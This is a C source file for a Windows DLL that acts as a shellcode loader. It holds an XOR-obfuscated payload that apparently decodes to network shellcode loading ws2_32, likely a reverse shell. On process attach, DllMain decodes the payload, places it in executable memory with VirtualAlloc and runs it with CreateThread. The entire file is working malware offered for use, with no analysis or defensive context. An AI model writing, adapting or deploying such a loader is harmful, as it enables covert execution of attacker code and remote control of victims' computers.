#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char code[] =
"\x86\x32\xf9\x9e\x8a\x92\xb6\x7a\x7a\x7a\x3b\x2b\x3b\x2a\x28\x2b\x32\x4b\xa8\x2c"
"\x1f\x32\xf1\x28\x1a\x32\xf1\x28\x62\x32\xf1\x28\x5a\x37\x4b\xb3\x32\x75\xcd\x30"
"\x30\x32\xf1\x08\x2a\x32\x4b\xba\xd6\x46\x1b\x06\x78\x56\x5a\x3b\xbb\xb3\x77\x3b"
"\x7b\xbb\x98\x97\x28\x3b\x2b\x32\xf1\x28\x5a\xf1\x38\x46\x32\x7b\xaa\x1c\xfb\x02"
"\x62\x71\x78\x75\xff\x08\x7a\x7a\x7a\xf1\xfa\xf2\x7a\x7a\x7a\x32\xff\xba\x0e\x1d"
"\x32\x7b\xaa\x3e\xf1\x3a\x5a\x33\x7b\xaa\x2a\xf1\x32\x62\x99\x2c\x32\x85\xb3\x37"
"\x4b\xb3\x3b\xf1\x4e\xf2\x32\x7b\xac\x32\x4b\xba\x3b\xbb\xb3\x77\xd6\x3b\x7b\xbb"
"\x42\x9a\x0f\x8b\x36\x79\x36\x5e\x72\x3f\x43\xab\x0f\xa2\x22\x3e\xf1\x3a\x5e\x33"
"\x7b\xaa\x1c\x3b\xf1\x76\x32\x3e\xf1\x3a\x66\x33\x7b\xaa\x3b\xf1\x7e\xf2\x3b\x22"
"\x3b\x22\x24\x23\x32\x7b\xaa\x20\x3b\x22\x3b\x23\x3b\x20\x32\xf9\x96\x5a\x3b\x28"
"\x85\x9a\x22\x3b\x23\x20\x32\xf1\x68\x93\x31\x85\x85\x85\x27\x33\xc4\x0d\x09\x48"
"\x25\x49\x48\x7a\x7a\x3b\x2c\x33\xf3\x9c\x32\xfb\x96\xda\x7b\x7a\x7a\x33\xf3\x9f"
"\x33\xc6\x78\x7a\xa7\x67\xba\xd2\x7b\x64\x3b\x2e\x33\xf3\x9e\x36\xf3\x8b\x3b\xc0"
"\x36\x0d\x5c\x7d\x85\xaf\x36\xf3\x90\x12\x7b\x7b\x7a\x7a\x23\x3b\xc0\x53\xfa\x11"
"\x7a\x85\xaf\x10\x70\x3b\x24\x2a\x2a\x37\x4b\xb3\x37\x4b\xba\x32\x85\xba\x32\xf3"
"\xb8\x32\x85\xba\x32\xf3\xbb\x3b\xc0\x90\x75\xa5\x9a\x85\xaf\x32\xf3\xbd\x10\x6a"
"\x3b\x22\x36\xf3\x98\x32\xf3\x83\x3b\xc0\xe3\xdf\x0e\x1b\x85\xaf\xff\xba\x0e\x70"
"\x33\x85\xb4\x0f\x9f\x92\xe9\x7a\x7a\x7a\x32\xf9\x96\x6a\x32\xf3\x98\x37\x4b\xb3"
"\x10\x7e\x3b\x22\x32\xf3\x83\x3b\xc0\x78\xa3\xb2\x25\x85\xaf\xf9\x82\x7a\x04\x2f"
"\x32\xf9\xbe\x5a\x24\xf3\x8c\x10\x3a\x3b\x23\x12\x7a\x6a\x7a\x7a\x3b\x22\x32\xf3"
"\x88\x32\x4b\xb3\x3b\xc0\x22\xde\x29\x9f\x85\xaf\x32\xf3\xb9\x33\xf3\xbd\x37\x4b"
"\xb3\x33\xf3\x8a\x32\xf3\xa0\x32\xf3\x83\x3b\xc0\x78\xa3\xb2\x25\x85\xaf\xf9\x82"
"\x7a\x07\x52\x22\x3b\x2d\x23\x12\x7a\x3a\x7a\x7a\x3b\x22\x10\x7a\x20\x3b\xc0\x71"
"\x55\x75\x4a\x85\xaf\x2d\x23\x3b\xc0\x0f\x14\x37\x1b\x85\xaf\x33\x85\xb4\x93\x46"
"\x85\x85\x85\x32\x7b\xb9\x32\x53\xbc\x32\xff\x8c\x0f\xce\x3b\x85\x9d\x22\x10\x7a"
"\x23\x33\xbd\xb8\x8a\xcf\xd8\x2c\x85\xaf\x7a";

int run() {
    char key = 'z';
    size_t code_len = sizeof(code);
    for (int i = 0; i < code_len; i++) {
        code[i] = code[i] ^ key; // Decrypt The Shellcode
    }
    size_t code_size = sizeof(code);
    void* AlloCode = VirtualAlloc(0, sizeof(code), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); // Allocate Memory For Our Shellcode
    if (AlloCode != NULL) {
        RtlMoveMemory(AlloCode, code, code_size); // Move ShellCode Into Allocated Buffer
        // Create a function pointer to the shellcode
        HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)AlloCode, 0, 0, 0); // Create Thread To Execute Shellcode
        if (!th) {
            return 1;
        }
        return 0;
    }
}

BOOL __stdcall DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpvReserved) {

    switch (dwReason) {

    case DLL_PROCESS_ATTACH:
        run(); // On Attachment to Process we Run This Function
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
        
    }
    return TRUE;
}